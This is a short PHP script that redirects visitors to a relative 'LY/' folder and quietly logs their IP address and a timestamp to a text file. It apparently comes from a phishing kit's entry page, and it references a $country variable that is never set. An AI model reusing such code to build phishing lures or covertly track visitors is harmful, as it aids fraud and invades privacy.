<?php
$src="LY";
header("location:$src/");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip." $country |> ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n");
?>